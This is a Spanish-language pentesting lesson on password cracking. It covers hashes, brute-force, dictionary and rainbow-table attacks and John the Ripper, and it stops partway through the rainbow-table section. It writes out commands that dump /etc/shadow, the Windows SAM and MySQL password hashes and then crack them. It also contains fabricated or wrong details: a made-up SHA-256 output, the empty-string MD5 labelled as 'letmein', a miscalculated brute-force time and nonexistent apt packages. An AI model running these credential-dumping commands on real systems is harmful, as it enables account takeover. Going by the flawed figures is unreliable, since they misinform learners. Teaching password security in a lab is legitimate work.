# CLASE 4: FUERZA BRUTA, RAINBOW TABLES Y JOHN THE RIPPER

---

## ÍNDICE

1. Conceptos Fundamentales de Ataques por Contraseñas
2. Tipos de Ataques: Fuerza Bruta, Diccionario, Rainbow Tables e Híbridos
3. Instalación y Configuración de Herramientas en Kali Linux
4. John the Ripper: Guía Completa Paso a Paso
5. Rainbow Tables: Teoría y Práctica
6. Hydra: Ataques de Fuerza Bruta a Servicios
7. Hashcat: Crackeo Acelerado por GPU
8. Laboratorio Práctico Completo
9. Contramedidas y Protección

---

## 1. CONCEPTOS FUNDAMENTALES DE ATAQUES POR CONTRASEÑAS

### 1.1. ¿Por qué son importantes las contraseñas?

Las contraseñas siguen siendo el método principal de autenticación en sistemas informáticos. Aunque existen alternativas como biometría o autenticación multifactor (MFA), las contraseñas siguen siendo omnipresentes. Por esto, evaluar la fortaleza de las contraseñas es una parte crítica del pentesting.

```
┌─────────────────────────────────────────────────────────────────┐
│              ANATOMÍA DE UN SISTEMA DE CONTRASEÑAS               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   USUARIO                SISTEMA                                 │
│   ──────                ──────                                 │
│                                                                 │
│   "admin"    ──────►   Buscar usuario en BD                    │
│                         │                                       │
│                         ▼                                       │
│   "password123"  ──►   Calcular hash                           │
│   (texto plano)         │                                       │
│                         │                                       │
│                         ▼                                       │
│                    Hash calculado:                             │
│                    SHA-256(password123)                         │
│                    = a8b3c4d5e6f7...                           │
│                         │                                       │
│                         ▼                                       │
│                    Comparar con hash almacenado:                │
│                    Hash almacenado:                              │
│                    = a8b3c4d5e6f7...                           │
│                         │                                       │
│                         ▼                                       │
│                    ¿COINCIDEN?                                  │
│                    ├─ SÍ → ACCESO CONCEDIDO                     │
│                    └─ NO → ACCESO DENEGADO                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2. ¿Qué es un Hash?

Un **hash** es una función criptográfica unidireccional que convierte una entrada (como una contraseña) en una cadena de caracteres de longitud fija. No se puede obtener la contraseña original a partir del hash.

**Propiedades de las funciones hash:**

| Propiedad | Descripción | Implicación |
|-----------|-------------|-------------|
| **Unidireccional** | No se puede revertir | No puedes "des-hashear" |
| **Determinista** | Mismo input = mismo output | Útil para verificación |
| **Efecto avalancha** | Pequeño cambio = hash diferente | Evita deducir patrones |
| **Resistencia a colisiones** | Difícil encontrar mismo hash | Garantía de unicidad |
| **Longitud fija** | Siempre mismo tamaño | Oculta longitud original |

**Ejemplo práctico:**

```bash
# En Kali Linux, calcula hashes de diferentes contraseñas
echo -n "password" | sha256sum
# Resultado: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

echo -n "Password" | sha256sum
# Resultado: 1c7a51058aa3467ce5c8a9d5f02f1f1a72fb0c4c8ec9bf5f5a3d5f1c7a51058a
# ¡COMPLETAMENTE DIFERENTE! (las mayúsculas importan)
```

### 1.3. Tipos de Algoritmos de Hash para Contraseñas

```
┌─────────────────────────────────────────────────────────────────┐
│         ALGORITMOS DE HASH PARA CONTRASEÑAS                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ALGORITMOS LEGACY (NO USAR - COMPROMETIDOS)                   │
│  ├── MD5    → Roto, colisiones conocidas, 128 bits             │
│  ├── SHA-1   → Roto, colisiones conocidas, 160 bits           │
│  └── NTLM    → Usado en Windows legacy, sin salt               │
│                                                                 │
│  ALGORITMOS MODERNOS (RECOMENDADOS)                            │
│  ├── SHA-256 → Parte de SHA-2, 256 bits, seguro               │
│  ├── SHA-512 → Parte de SHA-2, 512 bits, muy seguro            │
│  ├── bcrypt  → Diseñado para contraseñas, costoso computar    │
│  ├── scrypt  → Similar a bcrypt, resistente a ASIC           │
│  └── Argon2  → Ganador de Password Hashing Competition        │
│                                                                 │
│  ALGORITMOS ESPECÍFICOS DE UNIX/LINUX                          │
│  ├── $1$     → MD5 crypt                                       │
│  ├── $2a$    → Blowfish                                       │
│  ├── $5$     → SHA-256 crypt                                  │
│  ├── $6$     → SHA-512 crypt                                  │
│  └── $y$     → Yescrypt (moderno)                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**¿Por qué importa el algoritmo?**

```
┌─────────────────────────────────────────────────────────────────┐
│         COMPARACIÓN DE TIEMPO DE CRACKEO                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Hash de "password123" en diferentes algoritmos:                │
│                                                                 │
│  MD5:     $1$ saltsalt$XBpvPtJwZ7L2x5xQvX8f.                    │
│           → Crackeo: < 1 segundo                               │
│                                                                 │
│  SHA-256: $5$saltgenerico$L5P9xVx9q8R2...                      │
│           → Crackeo: ~5 segundos                               │
│                                                                 │
│  SHA-512: $6$saltgenerico$12PvJxW...                           │
│           → Crackeo: ~30 segundos                              │
│                                                                 │
│  bcrypt:  $2a$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4.       │
│           → Crackeo: ~4 minutos                                 │
│           → Nota: El factor de costo (12) aumenta el tiempo    │
│                                                                 │
│  Argon2:  $argon2id$v=19$m=65536,t=3,p=4$...                    │
│           → Crackeo: ~10 minutos                                │
│           → Diseñado específicamente para contraseñas          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. TIPOS DE ATAQUES POR CONTRASEÑAS

### 2.1. Ataque de Fuerza Bruta (Brute Force)

**Definición:** Probar TODAS las combinaciones posibles de caracteres hasta encontrar la contraseña correcta.

**Características:**
- **Garantizado** si se prueban todas las combinaciones
- **Lento** para contraseñas largas
- **Costoso** computacionalmente

```
┌─────────────────────────────────────────────────────────────────┐
│              EJEMPLO DE FUERZA BRUTA                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Contraseña objetivo: "Ab3"                                     │
│                                                                 │
│  aaaaa   → ✗                                                    │
│  aaaab   → ✗                                                    │
│  aaaac   → ✗                                                    │
│  ...                                                           │
│  Ab3     → ✓ ¡ENCONTRADA!                                      │
│                                                                 │
│  Total de combinaciones intentadas: ~10,000                     │
│  Tiempo promedio: Depende de la potencia                        │
│                                                                 │
│  CONTRASEÑAS DE 4 CARACTERES (alfanumérico):                   │
│  Posibilidades = 62^4 = 14,776,336                              │
│  Con 100,000 intentos/segundo: ~2.5 minutos                    │
│                                                                 │
│  CONTRASEÑAS DE 8 CARACTERES (alfanumérico):                  │
│  Posibilidades = 62^8 = 218,000,000,000,000                     │
│  Con 100,000 intentos/segundo: ~694 años                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2. Ataque de Diccionario (Dictionary Attack)

**Definición:** Probar contraseñas de una lista predefinida (diccionario) en lugar de todas las combinaciones.

**Características:**
- **Más rápido** que fuerza bruta
- **Eficaz** contra contraseñas comunes
- **Dependiente** de la calidad del diccionario

```
┌─────────────────────────────────────────────────────────────────┐
│              ATAQUE DE DICCIONARIO                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Diccionario:                                                   │
│  ├── 123456                                                    │
│  ├── password                                                  │
│  ├── admin123                                                  │
│  ├── welcome1                                                  │
│  ├── iloveyou                                                  │
│  ├── password123                                               │
│  ├── qwerty                                                    │
│  └── ... (millones más)                                         │
│                                                                 │
│  CONTRASEÑAS MÁS COMUNES (2024):                               │
│  ├── 123456                                                    │
│  ├── 123456789                                                 │
│  ├── 12345678                                                   │
│  ├── qwerty                                                    │
│  ├── password                                                  │
│  ├── 12345                                                     │
│  ├── 1234567                                                   │
│  ├── admin123                                                  │
│  ├── letmein                                                   │
│  └── welcome1                                                  │
│                                                                 │
│  ESTADÍSTICA:                                                  │
│  → El 80% de las contraseñas están en los primeros 10,000      │
│    términos de un diccionario común                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.3. Rainbow Tables (Tablas Arcoíris)

**Definición:** Tablas precalculadas de hashes y sus contraseñas correspondientes. Permiten "revertir" hashes a contraseñas sin probar cada combinación.

**Concepto:** En lugar de calcular el hash cada vez, se lookup en una tabla enorme que ya tiene los cálculos hechos.

```
┌─────────────────────────────────────────────────────────────────┐
│              RAINBOW TABLES: CONCEPTO                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  TRADICIONAL:                                                  │
│  "password123" ──► [CALCULAR HASH] ──► a8b3c4d5...            │
│                                                                 │
│  RAINBOW TABLE:                                                │
│  Tabla precalculada:                                           │
│  ┌─────────────────────┬──────────────────────┐                │
│  │ CONTRASEÑA          │ HASH                 │                │
│  ├─────────────────────┼──────────────────────┤                │
│  │ password            │ 5f4dcc3b5aa765d...  │                │
│  │ admin               │ 21232f297a57a5a...  │                │
│  │ letmein             │ d41d8cd98f00b20...  │                │
│  │ ...                 │ ...                  │                │
│  └─────────────────────┴──────────────────────┘                │
│                                                                 │
│  Luego solo buscar el hash en la tabla:                         │
│  a8b3c4d5... ──► [LOOKUP EN TABLA] ──► "password123"         │
│                                                                 │
│  VENTAJA: Mucho más rápido que calcular cada hash              │
│  DESVENTAJA: Ocupa MUCHÍSIMO espacio en disco                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**¿Por qué existen las tablas arcoíris?**

```
┌─────────────────────────────────────────────────────────────────┐
│         RAINBOW TABLES VS FUERZA BRUTA                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FUERZA BRUTA:                                                 │
│  - Calcula hash para cada intento                               │
│  - Tiempo: Alto                                                 │
│  - Espacio: Bajo                                                │
│                                                                 │
│  RAINBOW TABLES:                                               │
│  - Precalcula TODOS los hashes de antemano                     │
│  - Tiempo de preparación: Días/semanas                          │
│  - Espacio: Gigabytes/terabytes                                │
│  - Tiempo de cracking: Segundos/minutos                        │
│                                                                 │
│  ANALOGÍA:                                                     │
│  - Fuerza bruta = Buscar en Google cada vez                    │
│  - Rainbow tables = Tener una enciclopedia completa offline    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.4. Ataques Híbridos

**Definición:** Combinan diccionarios con variaciones (números, mayúsculas, símbolos).

```
┌─────────────────────────────────────────────────────────────────┐
│              ATAQUE HÍBRIDO                                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  BASE DEL DICCIONARIO:                                          │
│  ├── password                                                  │
│  ├── admin                                                     │
│  ├── welcome                                                   │
│  └── ...                                                       │
│                                                                 │
│  VARIACIONES APLICADAS:                                        │
│  ├── 123 al final (password123)                                │
│  ├── 1! al final (password1!)                                 │
│  ├── Primera mayúscula (Password)                              │
│  ├── Leetspeak (p@ssw0rd)                                     │
│  ├── Año agregado (password2024)                               │
│  └── Combinaciones anteriores                                   │
│                                                                 │
│  EJEMPLO:                                                      │
│  Base: "password"                                              │
│  Variaciones generadas:                                        │
│  ├── password1                                                │
│  ├── password12                                               │
│  ├── Password                                                │
│  ├── PASSWORD                                                │
│  ├── p@ssword                                               │
│  ├── p@ssw0rd                                               │
│  ├── password!                                               │
│  └── password2024                                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.5. Credential Stuffing

**Definición:** Usar combinaciones de usuario/contraseña obtenidas de filtraciones anteriores.

```
┌─────────────────────────────────────────────────────────────────┐
│              CREDENTIAL STUFFING                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FUENTE DE CREDENCIALES:                                        │
│  ├── Filtraciones de datos (Have I Been Pwned)                 │
│  ├── Dark web                                                  │
│  ├── Bases de datos leakadas                                   │
│  └── Credenciales de otros servicios                            │
│                                                                 │
│  PROCESO:                                                      │
│  1. Obtener lista de credential pairs (email:password)        │
│  2. Probar cada par en el objetivo                             │
│  3. Aprovechar que usuarios reutilizan contraseñas            │
│                                                                 │
│  ESTADÍSTICA:                                                  │
│  → 65% de usuarios reutilizan contraseñas                       │
│  → Tasa de éxito: 0.1% - 10% dependiendo del target            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3. INSTALACIÓN Y CONFIGURACIÓN DE HERRAMIENTAS EN KALI LINUX

### 3.1. Verificar Herramientas Preinstaladas

Kali Linux viene con todas las herramientas de cracking preinstaladas. Verificamos:

```bash
# John the Ripper
john --version
# Expected: john ( Jumbo John) version 1.9.0

# Hashcat
hashcat --version
# Expected: v6.2.6

# Hydra
hydra -h | head -5
# Expected: Hydra v9.5

# Crunch (generador de diccionarios)
crunch --version
# Expected: Crunch version 3.6

# Johnny (GUI para John)
which johnny
```

### 3.2. Si Faltan Herramientas: Instalación Completa

```bash
# Actualizar Kali
sudo apt update && sudo apt upgrade -y

# Instalar todas las herramientas de cracking
sudo apt install -y \
    john \
    hashcat \
    hashcat-utils \
    oclhashcat \
    hydra \
    crunch \
    cupp \
    ceWL \
    gpp-decrypt \
    mkfakesmbpasswd \
    pdfcrack \
    truecrack \
    keccak-tiny \
    rarcrack \
    pdf2john \
    keepass2 \
    kpcli \
    samdump2 \
    chntpw

# Instalar herramientas adicionales útiles
sudo apt install -y \
    wordlists \
    seclists \
    rockyou.txt.gz \
    python3-pyrit \
    fcrackzip \
    zipcrack

# Descomprimir wordlist principal
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Verificar instalación
ls -lh /usr/share/wordlists/rockyou.txt
# Expected: -rw-r--r-- 1 root root 14M Apr  9 2024 /usr/share/wordlists/rockyou.txt
```

### 3.3. Wordlists Adicionales

```bash
# Instalar Seclists (colección completa de wordlists)
sudo apt install seclists

# Ver estructura de Seclists
ls -la /usr/share/seclists/

# Directorios importantes:
# ├── Passwords/          → Diccionarios de contraseñas
# ├── Usernames/          → Listas de nombres de usuario
# ├── Discovery/          → Rutas y archivos comunes
# └── Web-Content/        → Para fuzzing web

# Generar wordlist personalizada con Crunch
crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o mi_wordlist.txt

# Uso de CUPP (generador interactivo de diccionarios)
sudo apt install cupp
cupp -i  # Modo interactivo
```

### 3.4. Configuración de GPU para Hashcat (Opcional)

Si tienes una tarjeta NVIDIA o AMD, puedes usar GPU para acelerar el cracking:

```bash
# Para NVIDIA
sudo apt install nvidia-cuda-toolkit
nvidia-smi  # Verificar GPU detectada

# Para AMD (ROCm)
sudo apt install rocm-dev rocprofiler-compute
rocm-smi    # Verificar GPU detectada

# Verificar que Hashcat usa GPU
hashcat -I
# Expected: CUDA/API.* #1 - NVIDIA RTX...
# o: OpenCL/API.* #2 - AMD Radeon...
```

---

## 4. JOHN THE RIPPER: GUÍA COMPLETA PASO A PASO

### 4.1. ¿Qué es John the Ripper?

John the Ripper (JtR) es una de las herramientas más populares para crackeo de contraseñas. Soporta cientos de algoritmos de hash y puede ejecutarse en CPU y GPU.

```
┌─────────────────────────────────────────────────────────────────┐
│              JOHN THE RIPPER                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CARACTERÍSTICAS:                                              │
│  ├── Código abierto (open source)                              │
│  ├── Multiplataforma (Linux, Windows, macOS)                   │
│  ├── Soporta 100+ formatos de hash                            │
│  ├── Ataques: wordlist, incremental, híbrido                   │
│  ├── Optimizado para CPU y GPU                                │
│  └── "Jumbo John" = versión con más formatos                   │
│                                                                 │
│  MODOS DE ATAQUE:                                              │
│  ├── Single    → Usa información del hash (más rápido)        │
│  ├── Wordlist  → Lee de un archivo de palabras                 │
│  ├── Incremental → Genera todas las combinaciones             │
│  ├── Hybrid    → Wordlist + reglas                           │
│  └── External  → Define generadores personalizados            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2. Preparar Archivos para Cracking

#### 4.2.1. Diferentes Tipos de Archivos con Contraseñas

John puede extraer hashes de muchos tipos de archivos:

```bash
# ARCHIVOS COMUNES Y SUS HERRAMIENTAS DE EXTRACCIÓN:

# 1. Archivo /etc/shadow de Linux
# (Necesitas root o acceso al archivo)
sudo cat /etc/shadow | grep root
# root:$6$randomsalt$hashcompleto:19445:0:99999:7:::

# 2. SAM de Windows (desde archivo SAMdump)
samdump2 /mnt/Windows/System32/config/SAM > hashes_sam.txt

# 3. hashes de MySQL
# Extraer de base de datos MySQL
mysql -u root -p -e "SELECT user,authentication_string FROM mysql.user;" > mysql_hashes.txt

# 4. ZIP protegido con contraseña
zip2john archivo.zip > zip_hashes.txt

# 5. RAR protegido
rar2john archivo.rar > rar_hashes.txt

# 6. PDF
pdf2john.py documento.pdf > pdf_hashes.txt

# 7. SSH Keys
ssh2john.py id_rsa > ssh_hashes.txt

# 8. KeePass database
keepass2john Database.kdbx > keepass_hashes.txt

# 9. VPN (PPTP)
pptpd2john.py > vpn_hashes.txt

# 10. Web applications (Joomla, WordPress, etc.)
# Scripts disponibles en /usr/share/john/
```

#### 4.2.2. Extraer Hashes de Diferentes Fuentes

```bash
# Ver todos los scripts de extracción disponibles
ls /usr/share/john/*.py | head -20
ls /usr/share/john/*.pl | head -20

# EJEMPLO 1: Extraer hashes de Linux /etc/shadow
# (En el sistema objetivo)
sudo cat /etc/shadow | grep $ > shadow_hashes.txt
# Formato:
# usuario:$6$salt$hash:18393:0:99999:7:::

# EJEMPLO 2: Extraer hashes de Windows SAM
# Opción A: Con samdump2 (desde sistema Linux)
sudo samdump2 /mnt/sam > windows_hashes.txt

# Opción B: Con pwdump (desde sistema Windows)
# En Windows, ejecutar:
# pwdump.exe > windows_hashes.txt

# EJEMPLO 3: Extraer hashes de MariaDB/MySQL
mysql -u root -p'password' -e \
  "SELECT user,host,authentication_string FROM mysql.user;" \
  > mysql_hashes.txt

# EJEMPLO 4: Generar hash de prueba para practicar
echo -n "password123" | md5sum | cut -d' ' -f1
# Resultado: 482c811da5d5b4bc6d497ffa98491e38
# (Pero John usa formatos específicos, mejor usar generadores)
```

### 4.3. Cracking con John - Ejemplos Prácticos

#### 4.3.1. Ejemplo Básico: Cracking de Hash MD5

```bash
# PASO 1: Crear archivo de hash MD5
echo -n 'password123' | md5sum > test_hash.txt
cat test_hash.txt
# Resultado: 482c811da5d5b4bc6d497ffa98491e38  -

# Eliminar el espacio y guión al final
sed -i 's/  -//' test_hash.txt
cat test_hash.txt
# Resultado: 482c811da5d5b4bc6d497ffa98491e38

# PAS0 2: Cracking con wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt test_hash.txt

# SALIDA ESPERADA:
# Loaded 1 password hash (MD5 [128/128 AVX 4x2])
# Warning: no UTF-8 support detected
# Press 'q' or Ctrl-C to abort, almost any other key for status
# password123          (?)
# 1g 0:00:00:00 DONE (2024-04-09 12:00) 100.0g/s 0p/s 0c/s 0C/s
# Use the "--show" option to display all of the unloaded hashes

# PASO 3: Ver resultado
john --show test_hash.txt
# ?:password123

# 1 password hash cracked, 0 left
```

#### 4.3.2. Ejemplo: Cracking de Hash SHA-256

```bash
# Crear hash SHA-256
echo -n 'admin' | sha256sum | sed 's/  -//' > sha256_hash.txt
cat sha256_hash.txt
# 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918

# Cracking
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt sha256_hash.txt

# SALIDA:
# Loaded 1 password hash (Raw SHA-256 [256/256 AVX 2x])
# admin                (?)
# 1g 0:00:00:00 DONE
```

#### 4.3.3. Ejemplo: Cracking de /etc/shadow (Linux)

```bash
# En un sistema donde tienes acceso a /etc/shadow
# (Ejemplo en Kali o en una máquina de laboratorio)

# El formato típico de /etc/shadow es:
# usuario:$algorithm$salt$hash:fecha_cambio:min:max:aviso:expira:disabled

# EJEMPLO con hash SHA-512 ($6$):
# root:$6$randomsalt$Zq7J8K9L0M1N2O3P4Q5R6S7T8U9V0W1X2Y3Z4A5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0Q1:19445:0:99999:7:::

# Para crackear, extrae solo las líneas con hashes
grep -E '^\w+:\$' /etc/shadow > shadow.txt

# Cracking con John
john --shadow --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# SALIDA:
# Loaded 8 password hashes with 8 different salts (crypt, generic crypt)
# Trying dictionary file: rockyou.txt
# password          (root)
# 123456            (admin)
# admin             (user1)
# ...
```

#### 4.3.4. Ejemplo: Cracking de Hashes de Windows (NTLM)

```bash
# NTLM es el hash que usa Windows para almacenar contraseñas
# Formato: NO USAMOS EL LM (es antiguo y roto)

# Extraer hashes de Windows SAM
# Opción 1: Con samdump2 (desde Linux)
sudo samdump2 /mnt/Windows/System32/config/SAM > windows_hashes.txt

# Opción 2: Con secretsdump.py (desde Impacket)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    -sam sam.save \
    -system system.save \
    LOCAL > windows_hashes.txt

# Formato de hash NTLM:
# administrador:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Explicación:
# aad3b435b51404eeaad3b435b51404ee = LM hash (vacío o histórico)
# 31d6cfe0d16ae931b73c59d7e0c089c0 = NTLM hash (el que importa)

# Cracking
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt windows_hashes.txt

# SALIDA:
# Loaded 10 password hashes with 10 different salts
# 123456                    (administrator)
# password123               (usuario1)
```

#### 4.3.5. Ejemplo: Cracking de ZIP protegido

```bash
# CREAR UN ARCHIVO ZIP CON CONTRASEÑA (para practicar)
echo "contenido secreto" > secreto.txt
zip --password 'qwerty' secreto.zip secreto.txt

# EXTRAER EL HASH
zip2john secreto.zip > zip_hashes.txt
cat zip_hashes.txt
# secreto.zip:$zip2$*0*3*qwerty*...
# secrets.txt:$zip2$*1*3*qwerty*...

# CRACKING
john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt zip_hashes.txt

# SALIDA:
# Using default input encoding: UTF-8
# Loaded 1 password hash (ZIP [MD5 AES])
# qwerty                 (secreto.zip/secreto.txt)
# 1g 0:00:00:00 DONE
```

#### 4.3.6. Ejemplo: Cracking de PDF

```bash
# INSTALAR HERRAMIENTA
sudo apt install pdf2john  # o usa el script Python

# Si prefieres el script:
which pdf2john.py || locate pdf2john.py

# GENERAR PDF PROTEGIDO (para practicar)
pdftk input.pdf output protegido.pdf user_pw CONTRASEÑA123

# EXTRAER HASH
python3 /usr/share/john/pdf2john.py protegido.pdf > pdf_hashes.txt
cat pdf_hashes.txt
# protegido.pdf:$pdf$*4*4*128*...

# CRACKING
john --format=pdf --wordlist=/usr/share/wordlists/rockyou.txt pdf_hashes.txt

# SALIDA:
# Using default input encoding: UTF-8
# Loaded 1 password hash (PDF MD5 RC4)
# CONTRASEÑA123         (protegido.pdf)
```

### 4.4. Modos de Ataque Avanzados

#### 4.4.1. Modo Single (Más Rápido)

```bash
# El modo "single" usa información del nombre de usuario y hash
# para generar candidatos más probables

# Crear archivo de prueba con información
cat > test_single.txt << 'EOF'
admin:$1$ saltsalt $1$saltsalt$WqFvZF5Y8Z7Y8X7Y8Z7Y
root:$6$rootsalt$rootHashHere
user1:$5$usersalt$userHashHere
EOF

# Cracking con modo single
john --single test_single.txt

# SALIDA:
# Remaining 3 password hash types dry-run change: YES (eternal)
# Loaded 3 password hashes with 3 different salts
# Trying 'admin' -> 'admin' -> 'dmin' -> 'adm' -> 'admi' -> 'admini' -> 'administ'
# Using default input encoding: UTF-8
# Loading dictionary from default file: john.conf (edit to change)
```

#### 4.4.2. Modo Incremental (Todas las Combinaciones)

```bash
# El modo incremental genera TODAS las combinaciones
# IMPORTANTE: Puede tomar MUCHO tiempo

# Usar incremental para contraseñas de 1-4 caracteres
john --incremental:alpha --stdout | head -20
# Genera: a, b, c, ..., z, aa, ab, ...

# Usar incremental para contraseñas de 1-4 caracteres alfanumérico
john --incremental:alnum --stdout | head -50
# Genera: a, b, ..., z, A, ..., Z, 0, ..., 9, aa, ab, ...

# Cracking con modo incremental (usar con precaución)
john --incremental --min-length=1 --max-length=4 \
    --format=md5crypt test_hash.txt

# Para usar Incremental hasta encontrar (puede tomar AÑOS para contraseñas largas):
# john --incremental test_hash.txt
# Se detendrá cuando encuentre la contraseña
```

#### 4.4.3. Reglas de Wordlist (Wordlist + Variaciones)

```bash
# John puede aplicar reglas a las palabras del diccionario
# Ejemplo: agregar números, mayúsculas, símbolos

# Ver reglas configuradas
cat /etc/john/john.conf | grep -A20 '\[Rules:.*\]'

# Modo híbrido: wordlist + reglas
john --wordlist=/usr/share/wordlists/rockyou.txt \
     --rules \
     --format=md5 test_hash.txt

# REGLAS COMUNES:
# - Capitalizar primera letra: Password
# - Agregar números: Password123
# - Leetspeak: P@ssword
# - Combinaciones: PASSWORD123!

# Ver reglas específicas de Kali
cat /usr/share/john/default.conf | grep -A50 '\[List.Rules:HTW\]'
```

#### 4.4.4. Cracking Distribuido

```bash
# John soporta cracking distribuido
# Ejecutar en múltiples máquinas y compartir sesiones

# Máquina 1: Iniciar sesión
john --session=mihash --wordlist=wordlist.txt hash.txt

# Guardar sesión
# Ctrl+C guarda automáticamente

# Recuperar sesión en otra máquina
john --restore=mihash

# Para mejor distribución, usar hashcat o reglas de divide
```

### 4.5. Ejemplo Completo de Laboratorio

```bash
# ============================================================================
# LABORATORIO COMPLETO DE CRACKEO CON JOHN THE RIPPER
# ============================================================================

# PASO 1: Preparar el entorno
mkdir -p ~/lab_cracking && cd ~/lab_cracking

# PASO 2: Crear hashes de diferentes tipos para practicar
echo -n "admin123" | md5sum | sed 's/  -//' > hash_md5.txt
echo -n "password" | sha256sum | sed 's/  -//' > hash_sha256.txt
echo -n "secret" | sha512sum | sed 's/  -//' > hash_sha512.txt

# Crear archivo ZIP con contraseña
echo "datos sensibles" > datos.txt
zip --password 'qwerty' datos.zip datos.txt

# Extraer hashes
zip2john datos.zip > datos_hash.txt

# Ver contenido
echo "=== HASHES CREADOS ==="
echo "MD5:"
cat hash_md5.txt
echo "SHA256:"
cat hash_sha256.txt
echo "SHA512:"
cat hash_sha512.txt
echo "ZIP:"
cat datos_hash.txt

# PASO 3: Cracking de cada tipo

echo ""
echo "=== CRACKING MD5 ==="
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_md5.txt

echo ""
echo "=== CRACKING SHA256 ==="
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash_sha256.txt

echo ""
echo "=== CRACKING SHA512 ==="
john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt hash_sha512.txt

echo ""
echo "=== CRACKING ZIP ==="
john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt datos_hash.txt

# PASO 4: Ver todos los resultados
echo ""
echo "=== RESULTADOS FINALES ==="
john --show hash_md5.txt
john --show hash_sha256.txt
john --show hash_sha512.txt
john --show datos_hash.txt

# PASO 5: Ver sesiones guardadas
john --show

# ============================================================================
# RESULTADOS ESPERADOS:
# ============================================================================
# hash_md5.txt:admin123
# hash_sha256.txt:password
# hash_sha512.txt:secret
# datos.zip:qwerty
# ============================================================================
```

---

## 5. RAINBOW TABLES: TEORÍA Y PRÁCTICA

### 5.1. Teoría de Rainbow Tables

```
┌─────────────────────────────────────────────────────────────────┐
│              ¿CÓMO FUNCIONAN LAS RAINBOW TABLES?                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CONCEPTOS CLAVE:                                              │
│                                                                 │
│  1. FUNCIÓN DE REDUCCIÓN R(x)                                  │
│     Transforma un hash a una contraseña candidatos             │
│     Hash (32 chars) → R(x) → "abc123" (8 chars)               │
│                                                                 │
│  2. CADENA (CHAIN)                                             │
│     Hash → Reducir → Hash → Reducir → ... → Hash → Reducir    │
│                                                                 │
│  3. TABLA                                                      │
│     Solo almacenamos:                                          │
│     - Primera contraseña de la cadena                          │
│     - Último hash de la cadena                                 │
│                                                                 │
│     P1 ──► H1 ──► R1 ──► H2 ──► R2 ──► H3 ──► R3 ──► H4     │
│     │                                                    │     │
│     Inicio                                         Fin          │
│                                                                 │
│  4. CRACKEO                                                    │
│     Tenemos: Hx (hash a crackear)                              │
│     Buscamos: ¿Hx = Hn?                                        │
│                                                                 │
│     Si no: Reducimos Hx → Ry → Hy → ¿Hy = Hn?                 │
│     Repetimos... hasta encontrar                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 5.2. Cuándo Usar Rainbow Tables vs John

```
┌─────────────────────────────────────────────────────────────────┐
│         JOHN THE RIPPER vs RAINBOW TABLES                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  JOHN THE RIPPER                                                │
│  ├── Necesita tiempo de CPU en runtime                         │
│  ├── Sin espacio adicional (excepto wordlist)                  │
│  ├── Puede usar GPUs                                          │
│  ├── Flexible con reglas y variaciones                         │
│  └── Mejor para hashes con salt                                │
│                                                                 │
│  RAINBOW TABLES                                                │
│  ├── Crackeo INSTANTÁNEO (lookup)                             │
│  ├── Requiere MUCHÍSIMO espacio en disco                      │
│  ├── Solo funciona para hashes SIN SALT                        │
│  ├── Debe generarse/prepararse ANTES                          │
│  └── Mejor para hashes legacy (MD5, SHA-1 de contraseñas)      │
│                                                                 │
│  DECISIÓN:                                                     │
│  ├── ¿El hash TIENE SALT? → Usa John                          │
│  ├── ¿El hash NO tiene SALT (legacy)? → Usa Rainbow Tables    │
│  └── ¿No estás seguro? → Prueba ambos                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 5.3. Usar Rainbow Tables en Kali

```bash
# INSTALAR HERRAMIENTAS DE RAINBOW TABLES
sudo apt install rainbowcrack

# DESCARGAR RAINBOW TABLES PÚBLICAS
# ADVERTENCIA: Pueden ser MUY grandes (100GB+)

# Opción 1: Descargar tablas para MD5
cd /opt
wget http://project-rainbowcrack.com/table-md5.zip
unzip table-md5.zip

# Opción 2: Descargar tablas para NTLM (Windows)
wget http://project-rainbowcrack.com/table-ntlm.zip
unzip table-ntlm.zip

# Opción 3: Generar tablas propias (para práctica)
# Instalar genRainbowCrack
sudo apt install rainbowcrack

# Generar tabla MD5 para contraseñas de 1-7 caracteres
